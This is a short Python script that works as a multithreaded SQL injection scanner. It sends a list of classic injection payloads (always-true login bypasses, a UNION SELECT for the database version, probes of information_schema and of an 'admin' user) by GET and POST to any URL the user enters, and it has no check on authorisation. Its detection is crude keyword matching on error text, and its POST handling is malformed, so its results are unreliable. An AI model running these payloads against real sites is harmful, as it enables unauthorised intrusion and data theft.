import requests
from concurrent.futures import ThreadPoolExecutor

payloads = [
    "' OR '1'='1", 
    "' OR '1'='1' --", 
    "' OR '1'='1' #", 
    "' OR '1'='1'/*", 
    "' AND 1=CONVERT(int, CHAR(57)) --", 
    "' UNION SELECT NULL, @@version --", 
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --", 
    "' OR EXISTS(SELECT * FROM users WHERE username='admin') --", 
   
]

def check_payload(url, payload, method="GET"):
    try:
        if method == "POST":
            response = requests.post(url, data={payload: payload})
        else:
            response = requests.get(url + payload)
        
        response_text = response.text.lower()
        if any(keyword in response_text for keyword in ['error', 'syntax', 'warning', 'unexpected']):
            return f"Potential SQL Injection vulnerability found with payload: {payload}"
        else:
            return f"Payload {payload} appears safe."
    except requests.exceptions.RequestException as e:
        return f"Error scanning {url} with payload {payload}: {e}"

def scan_sql_injection(url):
    print(f"Scanning {url} for SQL Injection vulnerabilities...")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
       
        futures = [
            executor.submit(check_payload, url, payload, method="GET") 
            for payload in payloads
        ] + [
            executor.submit(check_payload, url, payload, method="POST") 
            for payload in payloads
        ]
        
        for future in futures:
            print(future.result())


if __name__ == "__main__":
    target_url = input("Enter the target URL: ").strip()
    if target_url:
        scan_sql_injection(target_url)
    else:
        print("Invalid URL. Please provide a valid URL.")

